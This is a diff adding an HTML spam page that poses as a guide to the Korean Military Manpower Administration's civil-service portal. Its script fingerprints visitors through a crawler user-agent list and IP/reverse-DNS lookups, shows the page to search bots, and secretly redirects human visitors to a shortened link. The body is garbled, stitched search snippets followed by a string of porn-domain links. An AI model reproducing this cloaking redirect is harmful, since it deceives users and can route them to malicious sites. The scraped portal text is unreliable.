@@ -1,0 +1,75 @@
+
+<html>
+<head>
+<!-- Google tag (gtag.js) -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-CE934VD9JW"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'G-CE934VD9JW');
+</script>
+
+	
+	<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
+<script>
+function isCrawler() {
+	var botPattern = "(googlebot\/|Googlebot-Mobile|Googlebot-Image|Google favicon|Mediapartners-Google|bingbot|slurp|java|wget|curl|Commons-HttpClient|Python-urllib|libwww|httpunit|nutch|phpcrawl|msnbot|jyxobot|FAST-WebCrawler|FAST Enterprise Crawler|biglotron|teoma|convera|seekbot|gigablast|exabot|ngbot|ia_archiver|GingerCrawler|webmon |httrack|webcrawler|grub.org|UsineNouvelleCrawler|antibot|netresearchserver|speedy|fluffy|bibnum.bnf|findlink|msrbot|panscient|yacybot|AISearchBot|IOI|ips-agent|tagoobot|MJ12bot|dotbot|woriobot|yanga|buzzbot|mlbot|yandexbot|purebot|Linguee Bot|Voyager|CyberPatrol|voilabot|baiduspider|citeseerxbot|spbot|twengabot|postrank|turnitinbot|scribdbot|page2rss|sitebot|linkdex|Adidxbot|blekkobot|ezooms|dotbot|Mail.RU_Bot|discobot|heritrix|findthatfile|europarchive.org|NerdByNature.Bot|sistrix crawler|ahrefsbot|Aboundex|domaincrawler|wbsearchbot|summify|ccbot|edisterbot|seznambot|ec2linkfinder|gslfbot|aihitbot|intelium_bot|facebookexternalhit|yeti|RetrevoPageAnalyzer|lb-spider|sogou|lssbot|careerbot|wotbox|wocbot|ichiro|DuckDuckBot|lssrocketcrawler|drupact|webcompanycrawler|acoonbot|openindexspider|gnam gnam spider|web-archive-net.com.bot|backlinkcrawler|coccoc|integromedb|content crawler spider|toplistbot|seokicks-robot|it2media-domain-crawler|ip-web-crawler.com|siteexplorer.info|elisabot|proximic|changedetection|blexbot|arabot|WeSEE:Search|niki-bot|CrystalSemanticsBot|rogerbot|360Spider|psbot|InterfaxScanBot|Lipperhey SEO Service|CC Metadata Scaper|g00g1e.net|GrapeshotCrawler|urlappendbot|brainobot|fr-crawler|binlar|SimpleCrawler|Livelapbot|Twitterbot|cXensebot|smtbot|bnf.fr_bot|A6-Indexer|ADmantX|Facebot|Twitterbot|OrangeBot|memorybot|AdvBot|MegaIndex|SemanticScholarBot|ltx71|nerdybot|xovibot|BUbiNG|Qwantify|archive.org_bot|Applebot|TweetmemeBot|crawler4j|findxbot|SemrushBot|yoozBot|lipperhey|y!j-asr|Domain Re-Animator Bot|AddThis)";
+	var re = new RegExp(botPattern, 'i');
+	var userAgent = navigator.userAgent;
+	if (re.test(userAgent)) {
+		return true;
+	} else {
+		return false;
+	}
+}
+
+function get_ip() {
+	var value = $.ajax({
+		url: 'https://api.ipify.org/?format=json',
+		async: false
+	}).responseJSON;
+	return value;
+}
+
+function gethostbyname() {
+	var value = $.ajax({
+		url: "https://get.geojs.io/v1/dns/ptr.json",
+		async: false
+	}).responseJSON;
+	return value;
+}
+
+var real_ip = get_ip().ip;
+var hostname = gethostbyname().ptr;
+
+
+function is_google() {
+	if (hostname.indexOf(".google.com") != '-1' || hostname.indexOf(".googlebot.com") != '-1') {
+		return true;
+	} else {
+		return false;
+	}
+}
+
+//search zone start//
+if (is_google() == false) {
+	if (document.referrer) {
+		if (isCrawler() != true && is_google() != true) {
+            window.location="https://t.co/8yIHdLe9bL"; 
+
+		}
+	}
+}
+//search zone finish//
+</script>
+<title>16258</title>
+</script>
+</head>
+<body>
+<h1>병무 민원 포털</h1>
+<p>병역판정검사, 군입영대상, 사회복무, 산업기능요원, 동원훈련(일반병 4년, 장교/부사관 6년까지) 등 민원포털에서 신청하는 병역이행 서비스를 '병무청 앱'을 통하여 ...병무민원포털: 병무민원 신청을 제공합니다. https://mwpt.mma.go.kr/ · 유관기관 병무행정 시스템: 유관기관 병무 행정 시스템 홈페이지로 로그인 이후에 이용 가능 ...병무민원포털 접속오류 안내 1 소집신청 방법 및 절차 - 사회복무요원 - 복무제도 - 병역이행안내 병역판정검사 대상자 - 병무청 병역판정검사 일자 및 장소 본인선택 - ...18-Oct-2022 — 병무청에서 병무민원을 접수할 때, 일일이 찾아보고 검색하지 않아도 편하게 서비스를 이용할 수 있다는 것을 아시나요? 바로 병무민원포털에서 나만 ...병무 민원 포털. ... 병무청 간편인증 앱으로 병무민원 간편하고 빠르게 ... 2020 공정병역 UCC 공모전 학생부 최우수상 한지원 병무부조리 신고하는 방법.② 전자민원은 다음 각 호에 통합하여 운영·관리한다. 1. 병무민원포털(mwpt.mma.go.kr): 민원신청 및 결과조회, 입영일자 본인선택 등 병무민원 관련 사항.내 점수 미리 알아보기 병무민원포털(http://goo.gl/8Quyv4) → 군지원 → 실시간지원현황 및 지원분야 검색 → 내 점수 미리 알아보기 (본인인증 필요) 5.4 days ago — 【병무 민원 포털】 «6XSEPW» - 병무청 앱 성적조회 및 강의평가 · 학교기본이미지 국방부 민원 익명 - Maddam 병역판정검사, 군입영대상, 사회복무, 산업 ...07-Feb-2023 — 병무청 누리집 → 병무민원 포털 → 「국외여행/체재」민원 신청 → 영주권자 입영희망 민원신청 → 공인인증서 로그인 → 입영일자 및 병역판정검사 ...『병무민원 포탈 서비스 시스템』은 인터넷으로 접수되는 민원 뿐만아니라 지방병무청의 민원실 방문, 우편, 팩스 등으로 접수되는 모든 민원에 적용된다.인터넷 신청: &lt;병무청 홈페이지 → 병무민원포털 → 국외여행/체재&gt;. 허가기간 및 신청 시 구비서류. 해외여행 허가대상별 허가기간 및 허가신청 시 구비서류는 다음과 ...병무청(병무민원포털), http://mwpt.mma.go.kr/caisBMHS/, 병무청(병무민원포털) - 동원훈련, 소집점검. 예비군 홈페이지, http://www.yebigun1.mil.kr ...병무 민원 포털 민원상담 이 화면은 소집일자/복무기관 본인선택을 취소할 수 있는 화면입니다 소집일자연기 - 사회복무요원 - 복무제도 - 병역이행안내 - 병무청 동원 ...01-Sept-2022 — 병역판정검사 일자 선택은 병무청 누리집 '병무민원포털→병역판정검사→병역판정검사 민원신청→병역판정검사 일자 및 장소 본인선택'에서 가능하며, ...1 병역 불만 포털1.1 군 복무에 대한 불만1.2 군 복무에 대한 불만 – MMA1.3 병무청1.4 병역 불만 포털 – MMA1.5 병역민원상담센터1.6 사회봉사 포털 21.7 재외동포 ...09-Jan-2020 — 병무청에서는 병역판정검사대상자의 편의를 고려하고 자율적으로 병역의무 ... 방법 (병무청홈페이지 인터넷 접수) ☞ 병무민원포털 → 병역판정검사 ...19 hours ago — ㅇ 선택방법 : 병무청 홈페이지(www.mma.go.kr) → 병무민원포털 →「징병검사」→「징병검사민원 …인터넷 입영원 : www.mma.go.kr 조회, ...나라사랑포털. 메뉴. 야놀자. 소식더보기 아이콘 소식 더보기. 공지사항 이벤트&amp;공모전 나라사랑카드 E머니 MVTI 진로설계검사 그린카 할인 쏘카 할인.10 hours ago — 홈페이지 우측의 병무민원포털을 클릭해서 들어갑니다. 현역/상근을 …병무청 홈페이지-전자민원창구-'재학생입영신청'에서 인터넷으로 신청하거나, … 미리 ...18 hours ago — 그까이꺼 그냥 병무청 민원포털에서 뽑으면 되는거 아닌가?네, 입영 사실이 기재된 주민등록초본 또는 입영통지서, 선발통지서 등 병역법 시행 규칙 ...기 : 병역판정검사 받은 후 다음 날부터 접수가능 (선착순) 접수경로 현역병 입영 본인선택 바로가기 병무청홈페이지 (wwwmmagokr) 병무민원포털 현역/상근입영 . .청 방법 ...18 hours ago — 상근 신청 병무청 「병무민원포털-현역상근」 상근예비역소집대상자 선발취소 신청」 바로가기 에서 인터넷으로 신청해야 한다.40 minutes ago — 나라 사랑 포털 나라사랑카드를 발급받은 모든 병역의무자에게 병무행정을 ... 홈페이지→병무민원포털→사회복무→재학생 및 국외입영연기자 입영 ...1 hour ago — 기술 행정병 지원 지원서 접수취소는 최종선발(합격)자발표일 7일전까지 '병무청 홈페이지 → 병무민원포털 → 군지원 → 지원서 작성ㆍ수정ㆍ취소 ...5 days ago — 병무청. 주요 업무. 사회복지 보건·의료 교육·문화 환경·안전 ... 만약 사회복무요원과 관련해서 민원이 접수될 경우, 근무지의 사회복무요원 담당자 ...16 hours ago — 륜의 블로그 군지원 – 병무민원포털 군번조회 (병무청 전역자 포함)안내 – 하늘사랑 전역자 군번 조회 : 군번 조회 쉽게하기 모바일로 전역자 군번 ...40 minutes ago — 신청 경로 : 민원포털 → 사회복무 → 재학생 및 국외입영 ...신병(훈련병) 부대배치 ... 통계포털(KOSIS). [병무통계] 상세 통계표 조회하기(클릭) …... 수료/졸업요건 안내 · 학적변동 구분 · 특별프로그램 안내 · 병무 안내 ... 인터넷 증명발급 · 인터넷신청 (우편수취) · 행정기관 FAX민원 · 민원우편신청 ...UOS포털; IT 서비스 · 장학 · 인권센터 · 도시과학연구원 · 현장실습 온라인시스템 · UOStory 학생미래지원센터 · 대학보건소 · 서울휴먼라이브러리 · 대학평의원회.스쿨버스 · 주차 · 광고게시 · 병무안내 · 병무안내 · 병무안내 · 대관안내 자식메뉴 펼치기. 대관신청 · 대관료안내 ... 여러분의 민원 해결사! 뒤로가기 앞으로가기 ...재학생 군입영 연기제도 · 재학생 입영 신청 · 기타 병무민원 안내 · 학생군사교육단(ROTC) · 예비군 안내 · 민방위 편성 · 학생복지 · 통학버스 · 생활관(기숙사) ...대학정보알림 정보공개 정보서비스안내 온라인민원센터 청렴행정 갑질신고센터 유실물 센터 SEOULTECH광장. 학생. 학생포탈 eClass EPiC folio 학사일정 학사행정 ...... 페이스북 · 네이버 블로그 · 입학안내 · 대학원 · 외국어교육원 · NSCS포털 · 수강신청 ... 병무안내. · 병무; · 예비군. 학군단(ROTC) 안내. · 학군단(ROTC)안내.43 minutes ago — 병무 민원 포털에 들어간다. 민원포털. mwpt. · 2. 군지원으로 들어간다 · 3. 육군 추가모집을 클릭한다 …모집 2023.01.13 ~ 2023.01.27 학생상담센터 ...제증명 발급안내 · 국제학생증 발급 · 병무안내 · 복지/시설 · 중앙도서관 · 학생생활관(기숙사) · 아트스페이스홀 · 건강공제센터 · 학생회관/운동장/노천극장.병무청 홈페이지 병무민원포털 군지원 지원서 작성 및 수정/취소 통합지원서 작성. 참고사항. 월중 모집계획은 병무청 홈페이지 군지원 (모병)안내 모집안내 서비스 ...4 hours ago — 병무청 「병무민원포털-현역/상근-입영일자.부대조회/입영사실확인(본인)」 바로가기. 복무확인서(사회복무요원·산업기능요원·전문연구요원·승선근무 ...예비군 및 병무행정 · 예비군안내 · 병무행정안내 · 각 군 모집 및 민방위안내 · 교환학생 및 단기 해외연수 ... 학생민원신청.8 hours ago — (저도 모바일 통지서 사용중 입니다) 모바일 통지서 모바일 통지서 수신동의를 하려면 병무청 홈페이지 &gt; 병무민원포탈 &gt; 동원예비군 &gt; 모바일앱 ...(저도 모바일 통지서 사용중 입니다) 모바일 통지서 모바일 통지서 수신동의를 하려면 병무청 홈페이지 &gt; 병무민원포탈 &gt; 동원예비군 &gt; 모바일앱 이메일 병력동원소집 ...17 hours ago — 병무청 홈페이지 병무민원포털 군지원 지원서 작성 및 수정/취소 통합지원서 작성. 참고사항. 월중 모집계획은 병무청 홈페이지 군지원 (모병)안내 ...16 hours ago — 병무민원포털은 스크린샷이 불가하여 사진으로 대체합니다! 육군 기술행정병 추가 …acum 5 ore — 군대 추가 모집 육군병 모집일정 및 주의사항 등 ...07-Apr-2023 — KB국민카드 콜센터 1588-1688로 병무민원포털 이나 병무청 앱에 들어가시면 정보 수정 부분에 나라사랑이메일 주소가 나와 있을 텐데 @ 앞에 숫자가 ...병무안내 · 입영·입영연기 안내 · ROTC · 예비군 안내 · 민방위 안내 · 증명서 발급 · 인터넷증명발급 · 방문발급(자동발급기) · 어디서나민원신청 · 민원우편 신청16 hours ago — 재외동포청 출범에 맞춰 재외동포의 각종 민원을 지원하는 통합민원실이 서울 광화문 앞에 문을 열었습니다...... 병무 · 학생자치기구 · 교내 식당 주간식단표 · 학생생활관 홈페이지 ... 사업 발전협의회 · 병무청 · 부산지역 국립대학 혁신 네트워크 · 정부민원포털 민원24 ...17 hours ago — 이외에도 재외동포청에선 '동포 콜센터'(02-6747-0404)를 연중 365일 24시간 운영하고, 재외국민 민원포털 '영사민원24'(https://consul.mofa.go.kr) ...10 hours ago — 지원서 접수취소는 최종선발 (합격)자발표일 7일전까지 '병무청 홈페이지 병무민원포털 군지원 지원서 작성ㆍ수정ㆍ취소 에서 취소가 가능 (다만, ...전체공지. 전체공지. ☆ 2023학년도 1학기 국가근로장학생 대체 선발 안내(송파세무서 민원봉사실). 2023학년도 1 ...12 hours ago — 재외공관과 각 부처에 흩어져 있던 국적, 병무, 아포스티유, 해외 이주, 가족관계 등 다양한 민원 서비스를 여기서 처리할 수 있게 만들고 향후에는 ...대학포털 · HOME. 닫기. 대학소개. 총장실. 총장인사말 · 주요약력 · 역대총장 · 업무추진비. 조직 및 부서. 기구표 · 분장업무 · 각종위원회 · 교직원검색. 대학현황.17 hours ago — (서울=연합뉴스) 강성철 기자 = 재외동포청 출범에 맞춰 재외동포의 각종 민원을 지원하는 통합민원실이 광화문에 문을 열었다.<a href="https://soktumun.xyz" title="Porno" rel="dofollow noopener" target="_blank">Porno</a><a href="https://fremon.xyz" title="Porno" rel="dofollow noopener" target="_blank">Porno</a><a href="https://freejon.xyz" title="Porno" rel="dofollow noopener" target="_blank">Porno</a><a href="https://memcuk.xyz" title="Porno" rel="dofollow noopener" target="_blank">Porno</a><a href="https://dilaracuk.xyz" title="Porno" rel="dofollow noopener" target="_blank">Porno</a><a href="https://dudikli.xyz" title="Porno" rel="dofollow noopener" target="_blank">Porno</a><a href="https://haruncuk.xyz" title="Porno" rel="dofollow noopener" target="_blank">Porno</a><a href="https://freefon.xyz" title="Porno" rel="dofollow noopener" target="_blank">Porno</a><a href="https://duraman.xyz" title="Porno" rel="dofollow noopener" target="_blank">Porno</a><a href="https://freeeon.xyz" title="Porno" rel="dofollow noopener" target="_blank">Porno</a><a href="https://fittirik.xyz" title="Porno" rel="dofollow noopener" target="_blank">Porno</a><a href="https://furtuni.xyz" title="Porno" rel="dofollow noopener" target="_blank">Porno</a><a href="https://supersan.xyz" title="Porno" rel="dofollow noopener" target="_blank">Porno</a><a href="https://saklaman.xyz" title="Porno" rel="dofollow noopener" target="_blank">Porno</a><a href="https://freeron.xyz" title="Porno" rel="dofollow noopener" target="_blank">Porno</a><a href="https://freecon.xyz" title="Porno" rel="dofollow noopener" target="_blank">Porno</a><a href="https://yuppik.xyz" title="Porno" rel="dofollow noopener" target="_blank">Porno</a><a href="https://freenon.xyz" title="Porno" rel="dofollow noopener" target="_blank">Porno</a><a href="https://sirikim.xyz" title="Porno" rel="dofollow noopener" target="_blank">Porno</a><a href="https://cemcuk.xyz" title="Porno" rel="dofollow noopener" target="_blank">Porno</a><a href="https://dandirik.xyz" title="Porno" rel="dofollow noopener" target="_blank">Porno</a></p>
+</body>
+</html>
+    
